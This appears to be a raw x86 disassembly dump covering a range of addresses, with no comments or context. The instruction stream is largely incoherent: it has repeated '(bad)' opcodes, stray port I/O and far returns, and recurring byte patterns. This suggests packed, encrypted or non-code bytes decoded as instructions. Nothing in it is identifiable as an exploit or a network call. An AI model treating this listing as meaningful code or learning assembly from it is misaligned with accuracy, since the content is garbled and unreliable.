  42766b:	lock test BYTE PTR [ebx-0x3],ah
  42766f:	xlat   BYTE PTR ds:[ebx]
  427670:	sbb    eax,DWORD PTR [eax-0xf7f7489]
  427676:	mov    edx,DWORD PTR [ebx+0x7c]
  427679:	push   ebx
  42767a:	adc    DWORD PTR [edx-0x454df37a],esi
  427680:	sub    edi,edi
  427682:	mov    dl,0xbe
  427684:	jg     0x4276c0
  427686:	lea    ecx,[ebp-0x6656da1e]
  42768c:	dec    ebp
  42768d:	xlat   BYTE PTR ds:[ebx]
  42768e:	add    BYTE PTR [ecx],0x77
  427691:	push   ss
  427692:	or     al,BYTE PTR [esi+0x4d4da00c]
  427698:	xor    BYTE PTR [edi-0x76],0x80
  42769c:	lock mov dl,BYTE PTR [ebx+0x7c]
  4276a0:	push   ebx
  4276a1:	adc    DWORD PTR [edx-0x794dd646],esi
  4276a7:	or     al,0xff
  4276a9:	mov    dl,0x80
  4276ab:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  4276b0:	xchg   ebx,eax
  4276b1:	xor    BYTE PTR [edi-0x75],0x80
  4276b5:	lock mov edx,DWORD PTR [ebx+0x7c]
  4276b9:	push   ebx
  4276ba:	adc    DWORD PTR [edx-0x794dd646],esi
  4276c0:	or     al,0xff
  4276c2:	mov    dl,0x80
  4276c4:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  4276c9:	daa    
  4276ca:	xor    BYTE PTR [edi-0x75],0x80
  4276ce:	lock mov edx,DWORD PTR [ebx+0x7c]
  4276d2:	push   ebx
  4276d3:	adc    DWORD PTR [edx-0x454df37a],esi
  4276d9:	sub    edi,edi
  4276db:	mov    dl,0xa
  4276dd:	cdq    
  4276de:	add    DWORD PTR [edi+0x16],esi
  4276e1:	or     al,BYTE PTR [esi+0x4d4d8b34]
  4276e7:	xor    BYTE PTR [edi-0x76],0x80
  4276eb:	lock mov dl,BYTE PTR [ebx+0x7c]
  4276ef:	push   ebx
  4276f0:	adc    DWORD PTR [edx-0x454df37a],esi
  4276f6:	sub    edi,edi
  4276f8:	mov    dl,0xa
  4276fa:	cdq    
  4276fb:	add    DWORD PTR [edi+0x16],esi
  4276fe:	or     al,BYTE PTR [esi+0x4d4d8b4c]
  427704:	xor    BYTE PTR [edi-0x7e],0xec
  427708:	cld    
  427709:	push   eax
  42770a:	ja     0x427721
  42770c:	dec    ebp
  42770d:	xlat   BYTE PTR ds:[ebx]
  42770e:	ds dec ebp
  427710:	xlat   BYTE PTR ds:[ebx]
  427711:	adc    eax,0xec367780
  427716:	ja     0x427707
  427718:	or     al,BYTE PTR [esi+0x4d4d82e5]
  42771e:	xor    BYTE PTR [edi-0x76],0x80
  427722:	lock mov dl,BYTE PTR [ebx+0x7c]
  427726:	push   ebx
  427727:	adc    DWORD PTR [edx-0x794dd646],esi
  42772d:	or     al,0xff
  42772f:	mov    dl,0x80
  427731:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  427736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427737:	xor    BYTE PTR [edi-0x75],0x80
  42773b:	lock mov edx,DWORD PTR [ebx+0x7c]
  42773f:	push   ebx
  427740:	adc    DWORD PTR [edx-0x794dd646],esi
  427746:	or     al,0xff
  427748:	mov    dl,0x80
  42774a:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  42774f:	rol    BYTE PTR [eax-0xf7f7489],0x8b
  427756:	push   ebx
  427757:	jl     0x42770b
  427759:	xchg   BYTE PTR [ebx+edx*2],cl
  42775c:	adc    DWORD PTR [edx-0x4d00d646],esi
  427762:	or     cl,BYTE PTR [ebp-0x29]
  427765:	xor    BYTE PTR ds:[edi+0x36],0xec
  42776a:	ja     0x42775b
  42776c:	or     al,BYTE PTR [esi+0x4d4d8b1d]
  427772:	xor    BYTE PTR [edi-0x76],0x80
  427776:	lock mov dl,BYTE PTR [ebx+0x7c]
  42777a:	mov    dl,0x86
  42777c:	or     al,0x53
  42777e:	adc    DWORD PTR [edx-0x4d00d646],esi
  427784:	or     cl,BYTE PTR [ebp-0x29]
  427787:	xor    BYTE PTR ds:[edi+0x36],0xec
  42778c:	ja     0x42777d
  42778e:	or     al,BYTE PTR [esi+0x4d4d4b0b]
  427794:	xor    al,0x46
  427797:	xor    BYTE PTR [edi+0x46],0x53
  42779b:	je     0x4277f0
  42779d:	sub    dh,BYTE PTR [edx-0x7b4df342]
  4277a3:	sub    edi,edi
  4277a5:	mov    dl,0x80
  4277a7:	lock cs push ebx
  4277aa:	mov    dl,0x40
  4277ac:	lea    edi,[edx]
  4277ae:	lea    ecx,[ebp-0x72c8ea2b]
  4277b4:	int    0x8d
  4277b6:	lea    ecx,[edx]
  4277b8:	dec    ebp
  4277b9:	xlat   BYTE PTR ds:[ebx]
  4277ba:	ds adc bh,0x36
  4277be:	in     al,dx
  4277bf:	xlat   BYTE PTR ds:[ebx]
  4277c0:	out    dx,eax
  4277c1:	xchg   BYTE PTR [esi-0x7fb2b258],bl
  4277c7:	ja     0x42783a
  4277c9:	xor    al,0x3e
  4277cc:	cmp    ch,bh
  4277ce:	xor    BYTE PTR [edi+0x3e],0xec
  4277d2:	ja     0x42775a
  4277d4:	push   eax
  4277d5:	ja     0x42775d
  4277d7:	xor    BYTE PTR [edi-0x75],0x80
  4277db:	lock mov edx,DWORD PTR [ebx+0x11]
  4277df:	mov    dl,0xba
  4277e1:	sub    DWORD PTR [ebx+0x7c],edx
  4277e4:	mov    dl,0x86
  4277e6:	or     al,0xff
  4277e8:	mov    dl,0x80
  4277ea:	lock xchg BYTE PTR [ecx],cl
  4277ed:	and    dh,BYTE PTR [edx-0x7f750f80]
  4277f3:	xchg   edi,eax
  4277f4:	mov    dl,BYTE PTR [ebx+0x2a]
  4277f7:	push   ebx
  4277f8:	xchg   esp,eax
  4277f9:	mov    dl,0xbe
  4277fb:	or     al,0xb2
  4277fd:	clc    
  4277fe:	sub    edi,edi
  427800:	(bad)  
  427801:	in     al,dx
  427802:	lock mul DWORD PTR [ebx-0x4e]
  427806:	or     edx,ebp
  427808:	hlt    
  427809:	retf   
  42780a:	dec    ebp
  42780b:	dec    ebp
  42780c:	xor    BYTE PTR [edi-0x11],0xab
  427810:	test   eax,0x71fb70a3
  427815:	lea    edx,[edi-0x78127880]
  42781b:	adc    eax,0x539b9993
  427820:	push   0xffffff80
  427822:	ja     0x427859
  427824:	or     ch,0x2e
  427827:	cmp    cl,BYTE PTR [ebp-0x10687f73]
  42782d:	or     BYTE PTR [ebp-0x7fde2880],0xe7
  427834:	out    dx,eax
  427835:	and    BYTE PTR [edi-0x7588afdf],0x60
  42783c:	fistp  DWORD PTR [eax-0x21]
  42783f:	adc    DWORD PTR [ebx-0x4a],edx
  427842:	pop    esi
  427843:	xchg   BYTE PTR [edi+0x32532643],cl
  427849:	or     DWORD PTR [esi-0x3e],eax
  42784c:	or     al,0xb2
  42784e:	mov    esp,0x8d4ba229
  427853:	lea    ecx,[ebp+0xc88b2cd]
  427859:	push   ebx
  42785a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42785b:	dec    DWORD PTR [ebx-0x80]
  42785e:	out    0x1d,eax
  427860:	call   DWORD PTR [ebx+eiz*2+0x6313d79c]
  427867:	(bad)  
  427868:	xlat   BYTE PTR ds:[ebx]
  427869:	or     DWORD PTR [edx-0x54881f31],esp
  42786f:	push   esi
  427870:	sar    ebx,cl
  427872:	adc    al,0x62
  427874:	mov    esi,0x8d8d3a9c
  427879:	adc    BYTE PTR [edi+0x15d78071],0x80
  427880:	xchg   edi,eax
  427881:	out    dx,eax
  427882:	adc    bh,0x21
  427885:	adc    BYTE PTR [edi+0x21d780ef],0x80
  42788c:	out    0xef,eax
  42788e:	and    BYTE PTR [edi+0x53325321],0xb6
  427895:	or     DWORD PTR [esi-0x3e],eax
  427898:	or     al,0xb2
  42789a:	mov    esp,0x8d4ba229
  42789f:	lea    ecx,[ebp-0x5bac33]
  4278a5:	xchg   esp,eax
  4278a6:	mov    dl,0x88
  4278a8:	or     al,0xff
  4278aa:	dec    ebx
  4278ab:	and    bh,0x71
  4278ae:	and    BYTE PTR [edi-0x7f7daceb],0x77
  4278b5:	jno    0x42790a
  4278b7:	retf   
  4278b8:	xor    al,0x15
  4278bb:	or     DWORD PTR [esi-0x54],eax
  4278be:	or     al,0xb2
  4278c0:	test   BYTE PTR [ecx],ch
  4278c2:	push   ebx
  4278c3:	jo     0x4278c4
  4278c5:	retf   
  4278c6:	push   edi
  4278c7:	lea    ecx,[ebp-0x3b4d3273]
  4278cd:	or     al,0xff
  4278cf:	add    BYTE PTR [eax-0x63131089],0x13
  4278d6:	mov    BYTE PTR [eax+0x21d78051],0x80
  4278dd:	out    0x71,eax
  4278df:	and    BYTE PTR [edi-0x757b12eb],0xed
  4278e6:	mov    esp,0x29beb28a
  4278eb:	push   ebx
  4278ec:	jb     0x427945
  4278ee:	aad    0x58
  4278f0:	fist   WORD PTR [ecx]
  4278f2:	mov    ds:0x438f860b,al
  4278f7:	mov    es:0xdf58d54b,al
  4278fd:	adc    DWORD PTR [edx+0x438f86c6],esp
  427903:	es in  al,dx
  427905:	jl     0x42791a
  427907:	(bad)  
  427908:	(bad)  
  427909:	std    
  42790a:	(bad)  
  42790b:	jle    0x42796b
  42790d:	xchg   BYTE PTR [edi+0x5a22643],cl
  427913:	fstp   DWORD PTR [eax-0x21]
  427916:	adc    DWORD PTR [ebx-0x9],edx
  427919:	mov    ds:0xdf58e8cb,al
  42791e:	adc    edi,edx
  427920:	adc    esp,DWORD PTR [ebx-0x9]
  427923:	xlat   BYTE PTR ds:[ebx]
  427924:	or     DWORD PTR [edx+0x3ca10d57],esp
  42792a:	(bad)  
  42792c:	loope  0x427942
  42792e:	enter  0x25be,0x3a
  427932:	lea    ecx,[ebp-0x7f106880]
  427938:	xlat   BYTE PTR ds:[ebx]
  427939:	and    DWORD PTR [eax-0x187f1059],eax
  42793f:	and    DWORD PTR [ebx+0x32],edx
  427942:	pusha  
  427943:	fistp  DWORD PTR [eax-0x21]
  427946:	adc    DWORD PTR [ebx-0x4a],edx
  427949:	or     DWORD PTR [esi-0x3e],eax
  42794c:	or     al,0xb2
  42794e:	mov    BYTE PTR [ebx+edx*2],cl
  427951:	dec    ebp
  427952:	mov    dl,0xb4
  427954:	sub    DWORD PTR [eax-0x29],edx
  427957:	enter  0x9cff,0x80
  42795b:	out    0xc8,eax
  42795d:	cli    
  42795e:	lea    ecx,[ebp+0x453cd8d]
  427964:	inc    DWORD PTR [esi]
  427966:	and    BYTE PTR [edi+0x50238025],0xa7
  42796d:	xor    ah,BYTE PTR [ebx+0x3]
  427970:	xlat   BYTE PTR ds:[ebx]
  427971:	outs   dx,DWORD PTR ds:[esi]
  427972:	push   ebx
  427973:	jb     0x4279d8
  427975:	pushf  
  427976:	aad    0xb0
  427978:	dec    ebp
  427979:	xlat   BYTE PTR ds:[ebx]
  42797a:	xor    eax,0x4d25d780
  42797f:	xlat   BYTE PTR ds:[ebx]
  427980:	sub    eax,0x4d8ad74d
  427985:	pop    ecx
  427986:	xchg   BYTE PTR [ebx],dh
  427988:	dec    ebx
  427989:	dec    ebp
  42798a:	dec    ebp
  42798b:	push   eax
  42798c:	outs   dx,DWORD PTR ds:[esi]
  42798d:	mov    esi,0x8d8d8dfa
  427992:	adc    BYTE PTR [edi+0x21e780ef],0x53
  427999:	mov    edx,DWORD PTR [ebx-0x4a]
  42799c:	or     DWORD PTR [esi-0x7b],eax
  42799f:	or     al,0xb2
  4279a1:	popa   
  4279a2:	or     al,0x50
  4279a4:	out    0xc8,eax
  4279a6:	and    bh,0xef
  4279a9:	and    BYTE PTR [edi+0x29bcb221],0x53
  4279b0:	or     eax,0x53c8d780
  4279b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4279b6:	dec    DWORD PTR [ebx-0x80]
  4279b9:	out    0x71,eax
  4279bb:	push   ebx
  4279bc:	retf   
  4279bd:	call   DWORD PTR [eax+eax*4-0x7dacea59]
  4279c4:	cmp    BYTE PTR [eax+eax*4-0x19],0x71
  4279c9:	adc    BYTE PTR [ecx],0x80
  4279cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4279cd:	adc    eax,0xcfd4609
  4279d2:	mov    dl,0xbc
  4279d4:	sub    DWORD PTR [ebx-0x5c],edx
  4279d7:	mov    dl,0xbe
  4279d9:	or     al,0xa2
  4279db:	dec    ebx
  4279dc:	lea    ecx,[ebp+0x74ffcd8d]
  4279e2:	jmp    FWORD PTR [edx]
  4279e4:	arpl   di,si
  4279e6:	xlat   BYTE PTR ds:[ebx]
  4279e7:	sbb    DWORD PTR [ebx+0x5],esp
  4279ea:	xlat   BYTE PTR ds:[ebx]
  4279eb:	nop
  4279ec:	dec    edx
  4279ed:	push   ebx
  4279ee:	test   DWORD PTR [esi],ebx
  4279f0:	jne    0x4279b1
  4279f2:	push   0xffffffc8
  4279f4:	outs   dx,DWORD PTR ds:[esi]
  4279f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4279f6:	jbe    0x427a2c
  4279f8:	push   ebx
  4279f9:	test   DWORD PTR [esi],ebx
  4279fb:	jne    0x4279c1
  4279fd:	stos   BYTE PTR es:[edi],al
  4279fe:	xor    BYTE PTR [edi-0x11],0x80
  427a02:	lock and DWORD PTR [eax-0x287f1069],eax
  427a09:	and    DWORD PTR [edx+0x438f8605],esp
  427a0f:	es push edi
  427a11:	fistp  DWORD PTR [eax-0x21]
  427a14:	adc    DWORD PTR [ecx],ecx
  427a16:	inc    esi
  427a17:	std    
  427a18:	or     al,0x80
  427a1a:	ret    0x4d53
  427a1d:	push   ebx
  427a1e:	jb     0x4279d2
  427a20:	add    ch,BYTE PTR [ecx]
  427a22:	push   ebx
  427a23:	test   DWORD PTR [edx+0xba20cbe],esi
  427a29:	lea    ecx,[ebp+0x7cffcd8d]
  427a2f:	call   DWORD PTR [ecx+0x5f]
  427a32:	ja     0x4279be
  427a34:	xlat   BYTE PTR ds:[ebx]
  427a35:	out    dx,al
  427a36:	arpl   WORD PTR [esi+0x47a221d5],si
  427a3c:	fisubr WORD PTR [eax+0x2d]
  427a3f:	mov    ds:0xe3bb390a,al
  427a44:	les    esp,FWORD PTR [esi-0x5e2bc85e]
  427a4a:	adc    edx,ebp
  427a4c:	pop    esp
  427a4d:	js     0x427a73
  427a4f:	xor    ch,BYTE PTR [ebx-0x48f5c57]
  427a55:	sub    eax,0x8780978d
  427a5a:	in     eax,dx
  427a5b:	xchg   DWORD PTR [ecx],esp
  427a5d:	xor    BYTE PTR [edi-0x11],0x80
  427a61:	lock and DWORD PTR [ecx],ecx
  427a64:	inc    esi
  427a65:	std    
  427a66:	or     al,0xb2
  427a68:	mov    esi,0xeff0800c
  427a6d:	adc    BYTE PTR [edi-0x454d66df],0x29
  427a74:	xor    al,0x1d
  427a77:	cli    
  427a78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a79:	mov    DWORD PTR [esp+edx*8],0x7253fc53
  427a80:	(bad)  
  427a81:	sti    
  427a82:	push   eax
  427a83:	cmp    al,BYTE PTR [eax-0x327fda89]
  427a89:	cmp    cl,BYTE PTR ss:[ebp-0x7f107f73]
  427a90:	ja     0x427ab7
  427a92:	or     ch,0x36
  427a95:	cmp    cl,BYTE PTR [ebp-0x13727f73]
  427a9b:	xchg   edx,eax
  427a9c:	gs xor al,0x25
  427aa0:	adc    BYTE PTR [eax+0x32],0x3a
  427aa4:	lea    ecx,[ebp-0x1dea8080]
  427aaa:	out    dx,al
  427aab:	mov    ebp,0x8d8d818d
  427ab0:	dec    ebp
  427ab1:	push   edx
  427ab2:	or     ch,BYTE PTR [edx-0x73af49b3]
  427ab8:	xor    BYTE PTR [edi-0x11],0x80
  427abc:	lock and DWORD PTR [ecx],ecx
  427abf:	inc    esi
  427ac0:	std    
  427ac1:	or     al,0xb2
  427ac3:	mov    esi,0xeff0800c
  427ac8:	adc    BYTE PTR [edi+0x25d74d21],0x53
  427acf:	cld    
  427ad0:	push   ebx
  427ad1:	jb     0x427ad2
  427ad3:	sti    
  427ad4:	push   eax
  427ad5:	ja     0x427a61
  427ad7:	add    DWORD PTR [edi-0x76],esi
  427ada:	or     bl,BYTE PTR [ebx-0x4de228b3]
  427ae0:	mov    edx,0x15d74d29
  427ae5:	dec    ebp
  427ae6:	xlat   BYTE PTR ds:[ebx]
  427ae7:	jno    0x427b36
  427ae9:	xlat   BYTE PTR ds:[ebx]
  427aea:	and    DWORD PTR [ebp-0x29],ecx
  427aed:	out    dx,eax
  427aee:	xchg   BYTE PTR [ebx],dh
  427af0:	int3   
  427af1:	dec    ebp
  427af2:	dec    ebp
  427af3:	xor    BYTE PTR [edi-0x11],0x80
  427af7:	lock and DWORD PTR [ecx],ecx
  427afa:	inc    esi
  427afb:	std    
  427afc:	or     al,0xb2
  427afe:	mov    esi,0xeff0800c
  427b03:	adc    BYTE PTR [edi+0x53fc5321],0x72
  427b0a:	mov    dl,0xba
  427b0c:	sub    DWORD PTR [eax+0x63fbff09],eax
  427b12:	std    
  427b13:	aad    0x37
  427b15:	xor    BYTE PTR [edi+0x71],0x80
  427b19:	lock adc eax,0xcfd4609
  427b1f:	mov    dl,0xbe
  427b21:	or     al,0x80
  427b23:	lock jno 0x427aa6
  427b26:	xchg   edi,eax
  427b27:	adc    eax,0x7253fc53
  427b2c:	mov    dl,0xba
  427b2e:	sub    DWORD PTR [eax-0x400e210],eax
  427b34:	or     DWORD PTR [edx],esp
  427b36:	ja     0x427ac2
  427b38:	push   eax
  427b39:	cmp    ch,BYTE PTR [ecx-0x72e20490]
  427b3f:	xchg   edi,eax
  427b40:	add    BYTE PTR [edi-0x64666c6a],0x53
  427b47:	push   0xffffff80
  427b49:	xlat   BYTE PTR ds:[ebx]
  427b4a:	cmp    eax,0x80459780
  427b4f:	out    0x25,eax
  427b51:	pop    esi
  427b52:	xchg   BYTE PTR [edi-0x249fd9bd],cl
  427b58:	pop    eax
  427b59:	fist   WORD PTR [ecx]
  427b5b:	arpl   di,si
  427b5d:	or     esi,ecx
  427b5f:	dec    esp
  427b60:	lea    ecx,[ebp-0x3960fe73]
  427b66:	in     al,0xee
  427b68:	arpl   si,ax
  427b6a:	(bad)  
  427b6c:	arpl   si,ax
  427b6e:	xlat   BYTE PTR ds:[ebx]
  427b6f:	out    dx,eax
  427b70:	arpl   di,si
  427b72:	or     DWORD PTR [edi],ecx
  427b74:	pop    ss
  427b75:	or     al,0x8d
  427b77:	lea    esp,[edx-0x20a755f3]
  427b7d:	adc    edi,edx
  427b7f:	out    dx,eax
  427b80:	arpl   di,si
  427b82:	or     DWORD PTR [edi],ecx
  427b84:	das    
  427b85:	or     al,0x8d
  427b87:	lea    esp,[edx-0x20a766f3]
  427b8d:	adc    edi,edx
  427b8f:	out    dx,eax
  427b90:	arpl   di,si
  427b92:	or     DWORD PTR [edi],ecx
  427b94:	dec    ebx
  427b95:	lea    ecx,[ebp-0x56f25d73]
  427b9b:	pop    eax
  427b9c:	fist   WORD PTR [ecx]
  427b9e:	xlat   BYTE PTR ds:[ebx]
  427b9f:	out    dx,al
  427ba0:	arpl   di,si
  427ba2:	aad    0x3f
  427ba4:	mov    ds:0xdf58d00d,al
  427ba9:	adc    edi,edx
  427bab:	out    dx,eax
  427bac:	arpl   di,si
  427bae:	or     DWORD PTR [edi],ecx
  427bb0:	mov    al,ds:0xa28d8d3a
  427bb5:	or     eax,0x11df58b9
  427bba:	or     DWORD PTR [edi-0x24],ecx
  427bbd:	cmp    cl,BYTE PTR [ebp+0x9f7638d]
  427bc3:	(bad)  
  427bc5:	lea    ecx,[ebp+0x3aa2be8d]
  427bcb:	lea    ecx,[ebp+0x4d1dd74d]
  427bd1:	xlat   BYTE PTR ds:[ebx]
  427bd2:	sub    eax,0x4d15d74d
  427bd7:	xlat   BYTE PTR ds:[ebx]
  427bd8:	jno    0x427c27
  427bda:	xlat   BYTE PTR ds:[ebx]
  427bdb:	and    DWORD PTR [ebp-0x29],ecx
  427bde:	out    dx,eax
  427bdf:	xchg   bl,dl
  427be1:	or     eax,0xb7be4d4d
  427be6:	cmp    cl,BYTE PTR [ebp-0x3ef25d73]
  427bec:	pop    eax
  427bed:	fist   WORD PTR [ecx]
  427bef:	xlat   BYTE PTR ds:[ebx]
  427bf0:	out    dx,eax
  427bf1:	arpl   di,si
  427bf3:	or     DWORD PTR [edi],ecx
  427bf5:	loope  0x427b84
  427bf7:	lea    ecx,[ebp+0x58e40da2]
  427bfd:	fist   WORD PTR [ecx]
  427bff:	xlat   BYTE PTR ds:[ebx]
  427c00:	out    dx,eax
  427c01:	arpl   di,si
  427c03:	or     DWORD PTR [edi],ecx
  427c05:	mov    cl,0x3a
  427c07:	lea    ecx,[ebp+0x58d90da2]
  427c0d:	fist   WORD PTR [ecx]
  427c0f:	xlat   BYTE PTR ds:[ebx]
  427c10:	out    dx,al
  427c11:	arpl   di,si
  427c13:	aad    0x1d
  427c15:	mov    ds:0xdf58e60d,al
  427c1a:	adc    edi,edx
  427c1c:	out    dx,eax
  427c1d:	arpl   di,si
  427c1f:	or     DWORD PTR [edi],ecx
  427c21:	aam    0x3a
  427c23:	lea    ecx,[ebp+0x58e80da2]
  427c29:	fist   WORD PTR [ecx]
  427c2b:	les    eax,FWORD PTR [ecx]
  427c2d:	adc    BYTE PTR [edi+0x21d780ef],0x80
  427c34:	out    0xef,eax
  427c36:	and    BYTE PTR [edi+0x53325321],0xb6
  427c3d:	or     DWORD PTR [esi-0x3e],eax
  427c40:	or     al,0xb2
  427c42:	mov    esp,0x8d4ba229
  427c47:	lea    ecx,[ebp+0xc88b2cd]
  427c4d:	push   ebx
  427c4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c4f:	dec    DWORD PTR [ebx-0x80]
  427c52:	out    0xef,eax
  427c54:	call   DWORD PTR [eax+eax*4-0x6313de59]
  427c5b:	adc    eax,esi
  427c5d:	push   eax
  427c5e:	xchg   edi,eax
  427c5f:	out    dx,eax
  427c60:	push   eax
  427c61:	xlat   BYTE PTR ds:[ebx]
  427c62:	and    DWORD PTR [eax-0x287f1069],eax
  427c68:	and    DWORD PTR [eax-0x587f1019],eax
  427c6e:	and    DWORD PTR [ebx+0x32],edx
  427c71:	push   ebx
  427c72:	mov    dh,0x9
  427c74:	inc    esi
  427c75:	ret    0xb20c
  427c78:	mov    esp,0xb2a45329
  427c7d:	mov    BYTE PTR [edx+eiz*4],cl
  427c80:	dec    ebx
  427c81:	lea    ecx,[ebp-0x6b003273]
  427c87:	dec    DWORD PTR [ebx+0x3f]
  427c8a:	xchg   edi,eax
  427c8b:	jno    0x427cac
  427c8d:	xlat   BYTE PTR ds:[ebx]
  427c8e:	adc    eax,0x803d9780
  427c93:	xlat   BYTE PTR ds:[ebx]
  427c94:	inc    ebp
  427c95:	adc    BYTE PTR [edi+0x15d78071],0x80
  427c9c:	xchg   edi,eax
  427c9d:	jno    0x427c1f
  427c9f:	xlat   BYTE PTR ds:[ebx]
  427ca0:	adc    eax,0x8071e780
  427ca5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ca6:	adc    eax,0xb6533253
  427cab:	or     DWORD PTR [esi-0x3e],eax
  427cae:	or     al,0xb2
  427cb0:	mov    esp,0xa2a45329
  427cb5:	dec    ebx
  427cb6:	lea    ecx,[ebp-0x774d3273]
  427cbc:	or     al,0xff
  427cbe:	dec    ebx
  427cbf:	and    bh,0x3d
  427cc2:	call   DWORD PTR [eax+eax*4-0x34acba59]
  427cc9:	push   ebx
  427cca:	add    BYTE PTR [eax-0xf7fc289],0x45
  427cd1:	or     DWORD PTR [esi-0x54],eax
  427cd4:	or     al,0x53
  427cd6:	jo     0x427c8a
  427cd8:	test   BYTE PTR [ecx],ch
  427cda:	push   edi
  427cdb:	lea    ecx,[ebp-0x34003273]
  427ce1:	xor    al,0x71
  427ce4:	mov    dl,0xc4
  427ce6:	or     al,0xff
  427ce8:	sub    ah,0x9c
  427ceb:	adc    BYTE PTR [edi-0x1239eceb],0xba
  427cf2:	mov    dh,BYTE PTR [edx+0x6a532988]
  427cf8:	mov    ds:0xdf58d505,al
  427cfd:	adc    DWORD PTR [edx+0x438f86c2],esp
  427d03:	es and bh,0x3d
  427d07:	and    BYTE PTR [edi-0x754312bb],0xa2
  427d0e:	dec    ebx
  427d0f:	aad    0x58
  427d11:	fist   WORD PTR [ecx]
  427d13:	mov    ds:0x438f86c6,al
  427d18:	es in  al,dx
  427d1a:	sub    al,BYTE PTR [eax-0x6becda19]
  427d20:	(bad)  
  427d21:	sti    
  427d22:	push   edi
  427d23:	xchg   BYTE PTR [edi-0xf5d9bd],cl
  427d29:	add    eax,0x58d90ba2
  427d2e:	fist   WORD PTR [ecx]
  427d30:	cdq    
  427d31:	dec    ebp
  427d32:	xlat   BYTE PTR ds:[ebx]
  427d33:	xor    eax,0x9b2dd74d
  427d38:	dec    ebp
  427d39:	xlat   BYTE PTR ds:[ebx]
  427d3a:	sbb    eax,0x4d15d74d
  427d3f:	xlat   BYTE PTR ds:[ebx]
  427d40:	jno    0x427d8f
  427d42:	xlat   BYTE PTR ds:[ebx]
  427d43:	and    DWORD PTR [ebp-0x29],ecx
  427d46:	out    dx,eax
  427d47:	xchg   dh,al
  427d49:	int3   
  427d4a:	dec    ebp
  427d4b:	dec    ebp
  427d4c:	push   eax
  427d4d:	mov    WORD PTR [eax-0x5c565474],es
  427d53:	jo     0x427d50
  427d55:	cmp    eax,0xef97808d
  427d5a:	adc    bh,0x21
  427d5d:	and    bh,0xef
  427d60:	and    BYTE PTR [edi+0x53b65321],0x32
  427d67:	or     DWORD PTR [esi-0x3e],eax
  427d6a:	or     al,0xb2
  427d6c:	mov    esp,0x8d4ba229
  427d71:	lea    ecx,[ebp+0xc88b2cd]
  427d77:	push   ebx
  427d78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d79:	call   DWORD PTR [edi+edi*8+0x71e7804b]
  427d80:	and    BYTE PTR [edi-0x6300eb],0xc6
  427d87:	push   eax
  427d88:	xchg   edi,eax
  427d89:	jno    0x427ddb
  427d8b:	xlat   BYTE PTR ds:[ebx]
  427d8c:	adc    eax,0x803d9780
  427d91:	xlat   BYTE PTR ds:[ebx]
  427d92:	inc    ebp
  427d93:	adc    BYTE PTR [edi+0x15d78071],0x80
  427d9a:	xchg   edi,eax
  427d9b:	out    dx,eax
  427d9c:	adc    bh,0x21
  427d9f:	adc    BYTE PTR [edi+0x21d780ef],0x80
  427da6:	out    0xef,eax
  427da8:	and    BYTE PTR [edi+0x53b65321],0x32
  427daf:	or     DWORD PTR [esi-0x3e],eax
  427db2:	or     al,0xb2
  427db4:	mov    esp,0x8d4ba229
  427db9:	lea    ecx,[ebp-0x5bac33]
  427dbf:	xchg   esp,eax
  427dc0:	mov    dl,0x88
  427dc2:	or     al,0xff
  427dc4:	dec    ebx
  427dc5:	and    bh,0x71
  427dc8:	and    BYTE PTR [edi+0x53cb5315],0x82
  427dcf:	xor    BYTE PTR [edi+0x71],0x80
  427dd3:	lock adc eax,0xcac4609
  427dd9:	push   ebx
  427dda:	jo     0x427ddb
  427ddc:	retf   
  427ddd:	mov    dl,0x84
  427ddf:	sub    DWORD PTR [edi-0x73],edx
  427de2:	lea    ecx,[ebp+0xcc4b2cd]
  427de8:	inc    DWORD PTR [edx-0x7fc28880]
  427dee:	lock inc ebp
  427df0:	in     al,dx
  427df1:	pushf  
  427df2:	and    bh,0x3d
  427df5:	adc    eax,esi
  427df7:	and    BYTE PTR [edi-0x79fa5dbb],0x8f
  427dfe:	inc    ebx
  427dff:	es push edi
  427e01:	fistp  DWORD PTR [eax-0x21]
  427e04:	adc    DWORD PTR [ecx],ecx
  427e06:	inc    esi
  427e07:	std    
  427e08:	or     al,0xb2
  427e0a:	mov    esp,0xcbeb229
  427e0f:	push   ebx
  427e10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e11:	mov    ds:0x8d8d8d4b,al
  427e16:	int    0xff
  427e18:	sub    bh,bh
  427e1a:	je     0x427e08
  427e1c:	not    DWORD PTR [ebx]
  427e1e:	add    eax,0x80eff080
  427e23:	xchg   edi,eax
  427e24:	and    DWORD PTR [eax-0x587f8e19],eax
  427e2a:	adc    eax,0xed8abaed
  427e2f:	mov    esp,0xd505a28a
  427e34:	pop    eax
  427e35:	fist   WORD PTR [ecx]
  427e37:	mov    ds:0xdf58d54b,al
  427e3c:	adc    DWORD PTR [edx+0x6a532988],esi
  427e42:	mov    ds:0x438f86c2,al
  427e47:	mov    es:0x438f86c6,al
  427e4d:	es in  al,dx
  427e4f:	sub    dl,BYTE PTR [ebx]
  427e51:	xchg   esp,eax
  427e52:	mov    esi,0x4d4d0d48
  427e57:	xchg   edi,eax
  427e58:	add    BYTE PTR [edi-0x66e27813],0x60
  427e5f:	fstp   DWORD PTR [eax-0x21]
  427e62:	adc    DWORD PTR [eax-0x10],edx
  427e65:	xor    bl,BYTE PTR [esi-0x7a]
  427e68:	pop    DWORD PTR [ebx+0x26]
  427e6b:	push   eax
  427e6c:	ja     0x427e36
  427e6e:	jl     0x427ee7
  427e70:	xchg   ah,ah
  427e72:	pop    eax
  427e73:	fist   WORD PTR [ecx]
  427e75:	push   eax
  427e76:	ja     0x427dff
  427e78:	adc    BYTE PTR [edi-0x37287fce],0x9b
  427e7f:	or     DWORD PTR [esi-0x3e],eax
  427e82:	or     al,0xb2
  427e84:	mov    BYTE PTR [eax+eax*4],cl
  427e87:	xlat   BYTE PTR ds:[ebx]
  427e88:	xor    al,BYTE PTR [eax-0x5df53719]
  427e8e:	ret    0xc7a7
  427e91:	add    al,0xd4
